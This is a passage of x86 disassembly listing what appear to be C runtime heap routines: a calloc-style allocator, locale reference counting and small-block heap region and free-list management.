  42496e:	or     DWORD PTR [ebp-0x4],0xffffffff
  424972:	call   0x423893
  424977:	ret    
  424978:	push   0x10
  42497a:	push   0x4285c8
  42497f:	call   0x423858
  424984:	mov    esi,DWORD PTR [ebp+0x8]
  424987:	imul   esi,DWORD PTR [ebp+0xc]
  42498b:	mov    DWORD PTR [ebp-0x1c],esi
  42498e:	test   esi,esi
  424990:	jne    0x424993
  424992:	inc    esi
  424993:	xor    edi,edi
  424995:	mov    DWORD PTR [ebp-0x20],edi
  424998:	cmp    esi,0xffffffe0
  42499b:	ja     0x424a02
  42499d:	cmp    DWORD PTR ds:0x45d144,0x3
  4249a4:	jne    0x4249ed
  4249a6:	add    esi,0xf
  4249a9:	and    esi,0xfffffff0
  4249ac:	mov    DWORD PTR [ebp+0xc],esi
  4249af:	mov    ebx,DWORD PTR [ebp-0x1c]
  4249b2:	cmp    ebx,DWORD PTR ds:0x45cf04
  4249b8:	ja     0x4249ed
  4249ba:	push   0x4
  4249bc:	call   0x423a1f
  4249c1:	pop    ecx
  4249c2:	and    DWORD PTR [ebp-0x4],edi
  4249c5:	push   ebx
  4249c6:	call   0x425421
  4249cb:	pop    ecx
  4249cc:	mov    DWORD PTR [ebp-0x20],eax
  4249cf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249d3:	call   0x424a22
  4249d8:	mov    edi,DWORD PTR [ebp-0x20]
  4249db:	test   edi,edi
  4249dd:	je     0x4249f1
  4249df:	push   DWORD PTR [ebp-0x1c]
  4249e2:	push   0x0
  4249e4:	push   edi
  4249e5:	call   0x426160
  4249ea:	add    esp,0xc
  4249ed:	test   edi,edi
  4249ef:	jne    0x424a2b
  4249f1:	push   esi
  4249f2:	push   0x8
  4249f4:	push   DWORD PTR ds:0x45d140
  4249fa:	call   DWORD PTR ds:0x4280a4
  424a00:	mov    edi,eax
  424a02:	test   edi,edi
  424a04:	jne    0x424a2b
  424a06:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a0c:	je     0x424a2b
  424a0e:	push   esi
  424a0f:	call   0x426142
  424a14:	pop    ecx
  424a15:	test   eax,eax
  424a17:	jne    0x424993
  424a1d:	jmp    0x424a2d
  424a1f:	mov    esi,DWORD PTR [ebp+0xc]
  424a22:	push   0x4
  424a24:	call   0x42398b
  424a29:	pop    ecx
  424a2a:	ret    
  424a2b:	mov    eax,edi
  424a2d:	call   0x423893
  424a32:	ret    
  424a33:	push   esi
  424a34:	mov    esi,DWORD PTR [esp+0x8]
  424a38:	mov    eax,DWORD PTR [esi+0x3c]
  424a3b:	push   edi
  424a3c:	xor    edi,edi
  424a3e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a44:	je     0x424aa9
  424a46:	cmp    eax,edi
  424a48:	je     0x424aa9
  424a4a:	mov    eax,DWORD PTR [esi+0x2c]
  424a4d:	cmp    DWORD PTR [eax],edi
  424a4f:	jne    0x424aa9
  424a51:	mov    eax,DWORD PTR [esi+0x34]
  424a54:	cmp    eax,edi
  424a56:	je     0x424a74
  424a58:	cmp    DWORD PTR [eax],edi
  424a5a:	jne    0x424a74
  424a5c:	cmp    eax,DWORD PTR ds:0x45cef0
  424a62:	je     0x424a74
  424a64:	push   eax
  424a65:	call   0x42446a
  424a6a:	push   DWORD PTR [esi+0x3c]
  424a6d:	call   0x4263af
  424a72:	pop    ecx
  424a73:	pop    ecx
  424a74:	mov    eax,DWORD PTR [esi+0x30]
  424a77:	cmp    eax,edi
  424a79:	je     0x424a97
  424a7b:	cmp    DWORD PTR [eax],edi
  424a7d:	jne    0x424a97
  424a7f:	cmp    eax,DWORD PTR ds:0x45cef4
  424a85:	je     0x424a97
  424a87:	push   eax
  424a88:	call   0x42446a
  424a8d:	push   DWORD PTR [esi+0x3c]
  424a90:	call   0x426350
  424a95:	pop    ecx
  424a96:	pop    ecx
  424a97:	push   DWORD PTR [esi+0x2c]
  424a9a:	call   0x42446a
  424a9f:	push   DWORD PTR [esi+0x3c]
  424aa2:	call   0x42446a
  424aa7:	pop    ecx
  424aa8:	pop    ecx
  424aa9:	mov    eax,DWORD PTR [esi+0x40]
  424aac:	cmp    eax,DWORD PTR ds:0x45ceec
  424ab2:	je     0x424acc
  424ab4:	cmp    eax,edi
  424ab6:	je     0x424acc
  424ab8:	cmp    DWORD PTR [eax],edi
  424aba:	jne    0x424acc
  424abc:	push   eax
  424abd:	call   0x42446a
  424ac2:	push   DWORD PTR [esi+0x44]
  424ac5:	call   0x42446a
  424aca:	pop    ecx
  424acb:	pop    ecx
  424acc:	mov    eax,DWORD PTR [esi+0x50]
  424acf:	cmp    eax,DWORD PTR ds:0x45cdd0
  424ad5:	je     0x424af3
  424ad7:	cmp    eax,edi
  424ad9:	je     0x424af3
  424adb:	cmp    DWORD PTR [eax+0xb4],edi
  424ae1:	jne    0x424af3
  424ae3:	push   eax
  424ae4:	call   0x4261c0
  424ae9:	push   DWORD PTR [esi+0x50]
  424aec:	call   0x42446a
  424af1:	pop    ecx
  424af2:	pop    ecx
  424af3:	push   esi
  424af4:	call   0x42446a
  424af9:	pop    ecx
  424afa:	pop    edi
  424afb:	pop    esi
  424afc:	ret    
  424afd:	push   esi
  424afe:	call   0x42370d
  424b03:	mov    esi,eax
  424b05:	mov    eax,DWORD PTR [esi+0x64]
  424b08:	cmp    eax,DWORD PTR ds:0x45c58c
  424b0e:	je     0x424bba
  424b14:	test   eax,eax
  424b16:	je     0x424b47
  424b18:	mov    ecx,DWORD PTR [eax+0x2c]
  424b1b:	dec    DWORD PTR [eax]
  424b1d:	test   ecx,ecx
  424b1f:	je     0x424b23
  424b21:	dec    DWORD PTR [ecx]
  424b23:	mov    ecx,DWORD PTR [eax+0x34]
  424b26:	test   ecx,ecx
  424b28:	je     0x424b2c
  424b2a:	dec    DWORD PTR [ecx]
  424b2c:	mov    ecx,DWORD PTR [eax+0x30]
  424b2f:	test   ecx,ecx
  424b31:	je     0x424b35
  424b33:	dec    DWORD PTR [ecx]
  424b35:	mov    ecx,DWORD PTR [eax+0x40]
  424b38:	test   ecx,ecx
  424b3a:	je     0x424b3e
  424b3c:	dec    DWORD PTR [ecx]
  424b3e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b41:	dec    DWORD PTR [ecx+0xb4]
  424b47:	mov    ecx,DWORD PTR ds:0x45c58c
  424b4d:	mov    DWORD PTR [esi+0x64],ecx
  424b50:	mov    ecx,DWORD PTR ds:0x45c58c
  424b56:	inc    DWORD PTR [ecx]
  424b58:	mov    ecx,DWORD PTR ds:0x45c58c
  424b5e:	mov    ecx,DWORD PTR [ecx+0x2c]
  424b61:	test   ecx,ecx
  424b63:	je     0x424b67
  424b65:	inc    DWORD PTR [ecx]
  424b67:	mov    ecx,DWORD PTR ds:0x45c58c
  424b6d:	mov    ecx,DWORD PTR [ecx+0x34]
  424b70:	test   ecx,ecx
  424b72:	je     0x424b76
  424b74:	inc    DWORD PTR [ecx]
  424b76:	mov    ecx,DWORD PTR ds:0x45c58c
  424b7c:	mov    ecx,DWORD PTR [ecx+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	inc    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR ds:0x45c58c
  424b8b:	mov    ecx,DWORD PTR [ecx+0x40]
  424b8e:	test   ecx,ecx
  424b90:	je     0x424b94
  424b92:	inc    DWORD PTR [ecx]
  424b94:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9a:	mov    ecx,DWORD PTR [ecx+0x4c]
  424b9d:	inc    DWORD PTR [ecx+0xb4]
  424ba3:	test   eax,eax
  424ba5:	je     0x424bba
  424ba7:	cmp    DWORD PTR [eax],0x0
  424baa:	jne    0x424bba
  424bac:	cmp    eax,0x45c538
  424bb1:	je     0x424bba
  424bb3:	push   eax
  424bb4:	call   0x424a33
  424bb9:	pop    ecx
  424bba:	mov    eax,DWORD PTR [esi+0x64]
  424bbd:	pop    esi
  424bbe:	ret    
  424bbf:	push   0xc
  424bc1:	push   0x428758
  424bc6:	call   0x423858
  424bcb:	push   0xc
  424bcd:	call   0x423a1f
  424bd2:	pop    ecx
  424bd3:	and    DWORD PTR [ebp-0x4],0x0
  424bd7:	call   0x424afd
  424bdc:	mov    DWORD PTR [ebp-0x1c],eax
  424bdf:	or     DWORD PTR [ebp-0x4],0xffffffff
  424be3:	call   0x424bf1
  424be8:	mov    eax,DWORD PTR [ebp-0x1c]
  424beb:	call   0x423893
  424bf0:	ret    
  424bf1:	push   0xc
  424bf3:	call   0x42398b
  424bf8:	pop    ecx
  424bf9:	ret    
  424bfa:	push   0x140
  424bff:	push   0x0
  424c01:	push   DWORD PTR ds:0x45d140
  424c07:	call   DWORD PTR ds:0x4280a4
  424c0d:	test   eax,eax
  424c0f:	mov    ds:0x45cf00,eax
  424c14:	jne    0x424c17
  424c16:	ret    
  424c17:	mov    ecx,DWORD PTR [esp+0x4]
  424c1b:	and    DWORD PTR ds:0x45cef8,0x0
  424c22:	and    DWORD PTR ds:0x45cefc,0x0
  424c29:	mov    ds:0x45cf08,eax
  424c2e:	xor    eax,eax
  424c30:	mov    DWORD PTR ds:0x45cf04,ecx
  424c36:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c40:	inc    eax
  424c41:	ret    
  424c42:	mov    eax,ds:0x45cefc
  424c47:	lea    ecx,[eax+eax*4]
  424c4a:	mov    eax,ds:0x45cf00
  424c4f:	lea    ecx,[eax+ecx*4]
  424c52:	jmp    0x424c66
  424c54:	mov    edx,DWORD PTR [esp+0x4]
  424c58:	sub    edx,DWORD PTR [eax+0xc]
  424c5b:	cmp    edx,0x100000
  424c61:	jb     0x424c6c
  424c63:	add    eax,0x14
  424c66:	cmp    eax,ecx
  424c68:	jb     0x424c54
  424c6a:	xor    eax,eax
  424c6c:	ret    
  424c6d:	push   ebp
  424c6e:	mov    ebp,esp
  424c70:	sub    esp,0x10
  424c73:	mov    ecx,DWORD PTR [ebp+0x8]
  424c76:	mov    eax,DWORD PTR [ecx+0x10]
  424c79:	push   esi
  424c7a:	mov    esi,DWORD PTR [ebp+0xc]
  424c7d:	push   edi
  424c7e:	mov    edi,esi
  424c80:	sub    edi,DWORD PTR [ecx+0xc]
  424c83:	add    esi,0xfffffffc
  424c86:	shr    edi,0xf
  424c89:	mov    ecx,edi
  424c8b:	imul   ecx,ecx,0x204
  424c91:	lea    ecx,[ecx+eax*1+0x144]
  424c98:	mov    DWORD PTR [ebp-0x10],ecx
  424c9b:	mov    ecx,DWORD PTR [esi]
  424c9d:	dec    ecx
  424c9e:	test   cl,0x1
  424ca1:	mov    DWORD PTR [ebp-0x4],ecx
  424ca4:	jne    0x424f81
  424caa:	push   ebx
  424cab:	lea    ebx,[ecx+esi*1]
  424cae:	mov    edx,DWORD PTR [ebx]
  424cb0:	mov    DWORD PTR [ebp-0xc],edx
  424cb3:	mov    edx,DWORD PTR [esi-0x4]
  424cb6:	mov    DWORD PTR [ebp-0x8],edx
  424cb9:	mov    edx,DWORD PTR [ebp-0xc]
  424cbc:	test   dl,0x1
  424cbf:	mov    DWORD PTR [ebp+0xc],ebx
  424cc2:	jne    0x424d38
  424cc4:	sar    edx,0x4
  424cc7:	dec    edx
  424cc8:	cmp    edx,0x3f
  424ccb:	jbe    0x424cd0
  424ccd:	push   0x3f
  424ccf:	pop    edx
  424cd0:	mov    ecx,DWORD PTR [ebx+0x4]
  424cd3:	cmp    ecx,DWORD PTR [ebx+0x8]
  424cd6:	jne    0x424d1a
  424cd8:	cmp    edx,0x20
  424cdb:	mov    ebx,0x80000000
  424ce0:	jae    0x424cfb
  424ce2:	mov    ecx,edx
  424ce4:	shr    ebx,cl
  424ce6:	lea    ecx,[edx+eax*1+0x4]
  424cea:	not    ebx
  424cec:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424cf0:	dec    BYTE PTR [ecx]
  424cf2:	jne    0x424d17
  424cf4:	mov    ecx,DWORD PTR [ebp+0x8]
  424cf7:	and    DWORD PTR [ecx],ebx
  424cf9:	jmp    0x424d17
  424cfb:	lea    ecx,[edx-0x20]
  424cfe:	shr    ebx,cl
  424d00:	lea    ecx,[edx+eax*1+0x4]
  424d04:	not    ebx
  424d06:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d0d:	dec    BYTE PTR [ecx]
  424d0f:	jne    0x424d17
  424d11:	mov    ecx,DWORD PTR [ebp+0x8]
  424d14:	and    DWORD PTR [ecx+0x4],ebx
  424d17:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1a:	mov    edx,DWORD PTR [ebx+0x8]
  424d1d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d20:	mov    ecx,DWORD PTR [ebp-0x4]
  424d23:	add    ecx,DWORD PTR [ebp-0xc]
  424d26:	mov    DWORD PTR [edx+0x4],ebx
  424d29:	mov    edx,DWORD PTR [ebp+0xc]
  424d2c:	mov    ebx,DWORD PTR [edx+0x4]
  424d2f:	mov    edx,DWORD PTR [edx+0x8]
  424d32:	mov    DWORD PTR [ebx+0x8],edx
  424d35:	mov    DWORD PTR [ebp-0x4],ecx
  424d38:	mov    edx,ecx
  424d3a:	sar    edx,0x4
  424d3d:	dec    edx
  424d3e:	cmp    edx,0x3f
  424d41:	jbe    0x424d46
  424d43:	push   0x3f
  424d45:	pop    edx
  424d46:	mov    ebx,DWORD PTR [ebp-0x8]
  424d49:	and    ebx,0x1
  424d4c:	mov    DWORD PTR [ebp-0xc],ebx
  424d4f:	jne    0x424de4
  424d55:	sub    esi,DWORD PTR [ebp-0x8]
  424d58:	mov    ebx,DWORD PTR [ebp-0x8]
  424d5b:	sar    ebx,0x4
  424d5e:	push   0x3f
  424d60:	mov    DWORD PTR [ebp+0xc],esi
  424d63:	dec    ebx
  424d64:	pop    esi
  424d65:	cmp    ebx,esi
  424d67:	jbe    0x424d6b
  424d69:	mov    ebx,esi
  424d6b:	add    ecx,DWORD PTR [ebp-0x8]
  424d6e:	mov    edx,ecx
  424d70:	sar    edx,0x4
  424d73:	dec    edx
  424d74:	cmp    edx,esi
  424d76:	mov    DWORD PTR [ebp-0x4],ecx
  424d79:	jbe    0x424d7d
  424d7b:	mov    edx,esi
  424d7d:	cmp    ebx,edx
  424d7f:	je     0x424ddf
  424d81:	mov    ecx,DWORD PTR [ebp+0xc]
  424d84:	mov    esi,DWORD PTR [ecx+0x4]
  424d87:	cmp    esi,DWORD PTR [ecx+0x8]
  424d8a:	jne    0x424dc7
  424d8c:	cmp    ebx,0x20
  424d8f:	mov    esi,0x80000000
  424d94:	jae    0x424dad
  424d96:	mov    ecx,ebx
  424d98:	shr    esi,cl
  424d9a:	not    esi
  424d9c:	and    DWORD PTR [eax+edi*4+0x44],esi
  424da0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424da4:	jne    0x424dc7
  424da6:	mov    ecx,DWORD PTR [ebp+0x8]
  424da9:	and    DWORD PTR [ecx],esi
  424dab:	jmp    0x424dc7
  424dad:	lea    ecx,[ebx-0x20]
  424db0:	shr    esi,cl
  424db2:	not    esi
  424db4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424dbb:	dec    BYTE PTR [ebx+eax*1+0x4]
  424dbf:	jne    0x424dc7
  424dc1:	mov    ecx,DWORD PTR [ebp+0x8]
  424dc4:	and    DWORD PTR [ecx+0x4],esi
  424dc7:	mov    ecx,DWORD PTR [ebp+0xc]
  424dca:	mov    esi,DWORD PTR [ecx+0x8]
  424dcd:	mov    ecx,DWORD PTR [ecx+0x4]
  424dd0:	mov    DWORD PTR [esi+0x4],ecx
  424dd3:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd6:	mov    esi,DWORD PTR [ecx+0x4]
  424dd9:	mov    ecx,DWORD PTR [ecx+0x8]
  424ddc:	mov    DWORD PTR [esi+0x8],ecx
  424ddf:	mov    esi,DWORD PTR [ebp+0xc]
  424de2:	jmp    0x424de7
  424de4:	mov    ebx,DWORD PTR [ebp+0x8]
  424de7:	cmp    DWORD PTR [ebp-0xc],0x0
  424deb:	jne    0x424df5
  424ded:	cmp    ebx,edx
  424def:	je     0x424e75
  424df5:	mov    ecx,DWORD PTR [ebp-0x10]
  424df8:	lea    ecx,[ecx+edx*8]
  424dfb:	mov    ebx,DWORD PTR [ecx+0x4]
  424dfe:	mov    DWORD PTR [esi+0x8],ecx
  424e01:	mov    DWORD PTR [esi+0x4],ebx
  424e04:	mov    DWORD PTR [ecx+0x4],esi
  424e07:	mov    ecx,DWORD PTR [esi+0x4]
  424e0a:	mov    DWORD PTR [ecx+0x8],esi
  424e0d:	mov    ecx,DWORD PTR [esi+0x4]
  424e10:	cmp    ecx,DWORD PTR [esi+0x8]
  424e13:	jne    0x424e75
  424e15:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e19:	mov    BYTE PTR [ebp+0xf],cl
  424e1c:	inc    cl
  424e1e:	cmp    edx,0x20
  424e21:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e25:	jae    0x424e4c
  424e27:	cmp    BYTE PTR [ebp+0xf],0x0
  424e2b:	jne    0x424e3b
  424e2d:	mov    ecx,edx
  424e2f:	mov    ebx,0x80000000
  424e34:	shr    ebx,cl
  424e36:	mov    ecx,DWORD PTR [ebp+0x8]
  424e39:	or     DWORD PTR [ecx],ebx
  424e3b:	mov    ebx,0x80000000
  424e40:	mov    ecx,edx
  424e42:	shr    ebx,cl
  424e44:	lea    eax,[eax+edi*4+0x44]
  424e48:	or     DWORD PTR [eax],ebx
  424e4a:	jmp    0x424e75
  424e4c:	cmp    BYTE PTR [ebp+0xf],0x0
  424e50:	jne    0x424e62
  424e52:	lea    ecx,[edx-0x20]
  424e55:	mov    ebx,0x80000000
  424e5a:	shr    ebx,cl
  424e5c:	mov    ecx,DWORD PTR [ebp+0x8]
  424e5f:	or     DWORD PTR [ecx+0x4],ebx
  424e62:	lea    ecx,[edx-0x20]
  424e65:	mov    edx,0x80000000
  424e6a:	shr    edx,cl
  424e6c:	lea    eax,[eax+edi*4+0xc4]
  424e73:	or     DWORD PTR [eax],edx
  424e75:	mov    eax,DWORD PTR [ebp-0x4]
  424e78:	mov    DWORD PTR [esi],eax
  424e7a:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424e7e:	mov    eax,DWORD PTR [ebp-0x10]
  424e81:	dec    DWORD PTR [eax]
  424e83:	jne    0x424f80
  424e89:	mov    eax,ds:0x45cef8
  424e8e:	test   eax,eax
  424e90:	je     0x424f72
  424e96:	mov    ecx,DWORD PTR ds:0x45cf10
  424e9c:	mov    esi,DWORD PTR ds:0x428084
  424ea2:	push   0x4000
  424ea7:	shl    ecx,0xf
  424eaa:	add    ecx,DWORD PTR [eax+0xc]
  424ead:	mov    ebx,0x8000
  424eb2:	push   ebx
  424eb3:	push   ecx
  424eb4:	call   esi
  424eb6:	mov    ecx,DWORD PTR ds:0x45cf10
  424ebc:	mov    eax,ds:0x45cef8
  424ec1:	mov    edx,0x80000000
  424ec6:	shr    edx,cl
  424ec8:	or     DWORD PTR [eax+0x8],edx
  424ecb:	mov    eax,ds:0x45cef8
  424ed0:	mov    eax,DWORD PTR [eax+0x10]
  424ed3:	mov    ecx,DWORD PTR ds:0x45cf10
  424ed9:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424ee1:	mov    eax,ds:0x45cef8
  424ee6:	mov    eax,DWORD PTR [eax+0x10]
  424ee9:	dec    BYTE PTR [eax+0x43]
  424eec:	mov    eax,ds:0x45cef8
  424ef1:	mov    ecx,DWORD PTR [eax+0x10]
  424ef4:	cmp    BYTE PTR [ecx+0x43],0x0
  424ef8:	jne    0x424f03
  424efa:	and    DWORD PTR [eax+0x4],0xfffffffe
  424efe:	mov    eax,ds:0x45cef8
  424f03:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f07:	jne    0x424f72
  424f09:	push   ebx
  424f0a:	push   0x0
  424f0c:	push   DWORD PTR [eax+0xc]
  424f0f:	call   esi
  424f11:	mov    eax,ds:0x45cef8
  424f16:	push   DWORD PTR [eax+0x10]
  424f19:	push   0x0
  424f1b:	push   DWORD PTR ds:0x45d140
  424f21:	call   DWORD PTR ds:0x428088
  424f27:	mov    eax,ds:0x45cefc
  424f2c:	mov    edx,DWORD PTR ds:0x45cf00
  424f32:	lea    eax,[eax+eax*4]
  424f35:	shl    eax,0x2
  424f38:	mov    ecx,eax
  424f3a:	mov    eax,ds:0x45cef8
  424f3f:	sub    ecx,eax
  424f41:	lea    ecx,[ecx+edx*1-0x14]
  424f45:	push   ecx
  424f46:	lea    ecx,[eax+0x14]
  424f49:	push   ecx
  424f4a:	push   eax
  424f4b:	call   0x4267a0
  424f50:	mov    eax,DWORD PTR [ebp+0x8]
  424f53:	add    esp,0xc
  424f56:	dec    DWORD PTR ds:0x45cefc
  424f5c:	cmp    eax,DWORD PTR ds:0x45cef8
  424f62:	jbe    0x424f68
  424f64:	sub    DWORD PTR [ebp+0x8],0x14
  424f68:	mov    eax,ds:0x45cf00
  424f6d:	mov    ds:0x45cf08,eax
  424f72:	mov    eax,DWORD PTR [ebp+0x8]
  424f75:	mov    ds:0x45cef8,eax
  424f7a:	mov    DWORD PTR ds:0x45cf10,edi
  424f80:	pop    ebx
  424f81:	pop    edi
  424f82:	pop    esi
  424f83:	leave  
  424f84:	ret    
  424f85:	mov    eax,ds:0x45cefc
  424f8a:	mov    ecx,DWORD PTR ds:0x45cf0c
  424f90:	push   edi
  424f91:	xor    edi,edi
  424f93:	cmp    eax,ecx
  424f95:	jne    0x424fcb
  424f97:	lea    eax,[ecx+ecx*4+0x50]
  424f9b:	shl    eax,0x2
  424f9e:	push   eax
  424f9f:	push   DWORD PTR ds:0x45cf00
  424fa5:	push   edi
  424fa6:	push   DWORD PTR ds:0x45d140
  424fac:	call   DWORD PTR ds:0x4280b0
  424fb2:	cmp    eax,edi
  424fb4:	jne    0x424fba
  424fb6:	xor    eax,eax
  424fb8:	pop    edi
  424fb9:	ret    
  424fba:	add    DWORD PTR ds:0x45cf0c,0x10
  424fc1:	mov    ds:0x45cf00,eax
  424fc6:	mov    eax,ds:0x45cefc
  424fcb:	mov    ecx,DWORD PTR ds:0x45cf00
  424fd1:	push   esi
  424fd2:	push   0x41c4
  424fd7:	push   0x8
  424fd9:	push   DWORD PTR ds:0x45d140
  424fdf:	lea    eax,[eax+eax*4]
  424fe2:	lea    esi,[ecx+eax*4]
  424fe5:	call   DWORD PTR ds:0x4280a4
  424feb:	cmp    eax,edi
  424fed:	mov    DWORD PTR [esi+0x10],eax
  424ff0:	jne    0x424ff6
  424ff2:	xor    eax,eax
  424ff4:	jmp    0x425039
  424ff6:	push   0x4
  424ff8:	push   0x2000
  424ffd:	push   0x100000
  425002:	push   edi
  425003:	call   DWORD PTR ds:0x4280ac
  425009:	cmp    eax,edi
  42500b:	mov    DWORD PTR [esi+0xc],eax
  42500e:	jne    0x425022
  425010:	push   DWORD PTR [esi+0x10]
  425013:	push   edi
  425014:	push   DWORD PTR ds:0x45d140
  42501a:	call   DWORD PTR ds:0x428088
  425020:	jmp    0x424ff2
  425022:	or     DWORD PTR [esi+0x8],0xffffffff
  425026:	mov    DWORD PTR [esi],edi
  425028:	mov    DWORD PTR [esi+0x4],edi
  42502b:	inc    DWORD PTR ds:0x45cefc
  425031:	mov    eax,DWORD PTR [esi+0x10]
  425034:	or     DWORD PTR [eax],0xffffffff
  425037:	mov    eax,esi
  425039:	pop    esi
  42503a:	pop    edi
  42503b:	ret    
  42503c:	push   ebp
  42503d:	mov    ebp,esp
  42503f:	push   ecx
  425040:	push   ecx
  425041:	mov    ecx,DWORD PTR [ebp+0x8]
  425044:	mov    eax,DWORD PTR [ecx+0x8]
  425047:	push   ebx
  425048:	push   esi
  425049:	mov    esi,DWORD PTR [ecx+0x10]
  42504c:	push   edi
  42504d:	xor    ebx,ebx
  42504f:	jmp    0x425054
  425051:	shl    eax,1
  425053:	inc    ebx
  425054:	test   eax,eax
  425056:	jge    0x425051
  425058:	mov    eax,ebx
  42505a:	imul   eax,eax,0x204
  425060:	lea    eax,[eax+esi*1+0x144]
  425067:	push   0x3f
  425069:	mov    DWORD PTR [ebp-0x8],eax
  42506c:	pop    edx
  42506d:	mov    DWORD PTR [eax+0x8],eax
  425070:	mov    DWORD PTR [eax+0x4],eax
  425073:	add    eax,0x8
  425076:	dec    edx
  425077:	jne    0x42506d
  425079:	push   0x4
  42507b:	mov    edi,ebx
  42507d:	push   0x1000
  425082:	shl    edi,0xf
  425085:	add    edi,DWORD PTR [ecx+0xc]
  425088:	push   0x8000
  42508d:	push   edi
  42508e:	call   DWORD PTR ds:0x4280ac
  425094:	test   eax,eax
  425096:	jne    0x4250a0
  425098:	or     eax,0xffffffff
  42509b:	jmp    0x42513d
  4250a0:	lea    edx,[edi+0x7000]
  4250a6:	cmp    edi,edx
  4250a8:	mov    DWORD PTR [ebp-0x4],edx
  4250ab:	ja     0x4250f0
  4250ad:	mov    ecx,edx
  4250af:	sub    ecx,edi
  4250b1:	shr    ecx,0xc
  4250b4:	lea    eax,[edi+0x10]
  4250b7:	inc    ecx
  4250b8:	or     DWORD PTR [eax-0x8],0xffffffff
  4250bc:	or     DWORD PTR [eax+0xfec],0xffffffff
  4250c3:	lea    edx,[eax+0xffc]
  4250c9:	mov    DWORD PTR [eax],edx
  4250cb:	lea    edx,[eax-0x1004]
  4250d1:	mov    DWORD PTR [eax-0x4],0xff0
  4250d8:	mov    DWORD PTR [eax+0x4],edx
  4250db:	mov    DWORD PTR [eax+0xfe8],0xff0
  4250e5:	add    eax,0x1000
  4250ea:	dec    ecx
  4250eb:	jne    0x4250b8
  4250ed:	mov    edx,DWORD PTR [ebp-0x4]
  4250f0:	mov    eax,DWORD PTR [ebp-0x8]
  4250f3:	add    eax,0x1f8
  4250f8:	lea    ecx,[edi+0xc]
  4250fb:	mov    DWORD PTR [eax+0x4],ecx
  4250fe:	mov    DWORD PTR [ecx+0x8],eax
  425101:	lea    ecx,[edx+0xc]
  425104:	mov    DWORD PTR [eax+0x8],ecx
  425107:	mov    DWORD PTR [ecx+0x4],eax
  42510a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42510f:	xor    edi,edi
  425111:	inc    edi
  425112:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425119:	mov    al,BYTE PTR [esi+0x43]
  42511c:	mov    cl,al
  42511e:	inc    cl
  425120:	test   al,al
  425122:	mov    eax,DWORD PTR [ebp+0x8]
  425125:	mov    BYTE PTR [esi+0x43],cl
  425128:	jne    0x42512d
  42512a:	or     DWORD PTR [eax+0x4],edi
  42512d:	mov    edx,0x80000000
  425132:	mov    ecx,ebx
  425134:	shr    edx,cl
  425136:	not    edx
  425138:	and    DWORD PTR [eax+0x8],edx
  42513b:	mov    eax,ebx
  42513d:	pop    edi
  42513e:	pop    esi
  42513f:	pop    ebx
  425140:	leave  
  425141:	ret    
  425142:	push   ebp
  425143:	mov    ebp,esp
  425145:	sub    esp,0xc
  425148:	mov    ecx,DWORD PTR [ebp+0x8]
  42514b:	mov    eax,DWORD PTR [ecx+0x10]
  42514e:	push   ebx
  42514f:	push   esi
  425150:	mov    esi,DWORD PTR [ebp+0x10]
  425153:	push   edi
  425154:	mov    edi,DWORD PTR [ebp+0xc]
  425157:	mov    edx,edi
  425159:	sub    edx,DWORD PTR [ecx+0xc]
  42515c:	add    esi,0x17
  42515f:	shr    edx,0xf
  425162:	mov    ecx,edx
  425164:	imul   ecx,ecx,0x204
  42516a:	lea    ecx,[ecx+eax*1+0x144]
  425171:	mov    DWORD PTR [ebp-0xc],ecx
  425174:	mov    ecx,DWORD PTR [edi-0x4]
  425177:	and    esi,0xfffffff0
  42517a:	dec    ecx
  42517b:	cmp    esi,ecx
  42517d:	lea    edi,[ecx+edi*1-0x4]
  425181:	mov    ebx,DWORD PTR [edi]
  425183:	mov    DWORD PTR [ebp+0x10],ecx
  425186:	mov    DWORD PTR [ebp-0x4],ebx
  425189:	jle    0x4252e4
  42518f:	test   bl,0x1
  425192:	jne    0x4252dd
  425198:	add    ebx,ecx
  42519a:	cmp    esi,ebx
  42519c:	jg     0x4252dd
  4251a2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251a5:	sar    ecx,0x4
  4251a8:	dec    ecx
  4251a9:	cmp    ecx,0x3f
  4251ac:	mov    DWORD PTR [ebp-0x8],ecx
  4251af:	jbe    0x4251b7
  4251b1:	push   0x3f
  4251b3:	pop    ecx
  4251b4:	mov    DWORD PTR [ebp-0x8],ecx
  4251b7:	mov    ebx,DWORD PTR [edi+0x4]
  4251ba:	cmp    ebx,DWORD PTR [edi+0x8]
  4251bd:	jne    0x425202
  4251bf:	cmp    ecx,0x20
  4251c2:	mov    ebx,0x80000000
  4251c7:	jae    0x4251e3
  4251c9:	shr    ebx,cl
  4251cb:	mov    ecx,DWORD PTR [ebp-0x8]
  4251ce:	lea    ecx,[ecx+eax*1+0x4]
  4251d2:	not    ebx
  4251d4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4251d8:	dec    BYTE PTR [ecx]
  4251da:	jne    0x425202
  4251dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251df:	and    DWORD PTR [ecx],ebx
  4251e1:	jmp    0x425202
  4251e3:	add    ecx,0xffffffe0
  4251e6:	shr    ebx,cl
  4251e8:	mov    ecx,DWORD PTR [ebp-0x8]
  4251eb:	lea    ecx,[ecx+eax*1+0x4]
  4251ef:	not    ebx
  4251f1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4251f8:	dec    BYTE PTR [ecx]
  4251fa:	jne    0x425202
  4251fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251ff:	and    DWORD PTR [ecx+0x4],ebx
  425202:	mov    ecx,DWORD PTR [edi+0x8]
